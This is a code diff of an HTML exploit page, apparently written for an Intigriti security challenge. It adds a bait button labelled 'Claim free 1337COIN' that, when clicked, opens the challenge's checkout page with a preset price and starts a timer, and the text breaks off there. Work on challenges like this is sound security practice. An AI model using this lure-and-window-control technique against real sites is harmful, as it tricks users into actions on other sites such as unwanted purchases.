@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
+<button id="btn">Claim free 1337COIN</button>
 <script>
-window.onload = () => {
+document.getElementById('btn').onclick = () => {
     const win = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000', 'x');
 
     setTimeout(() => {
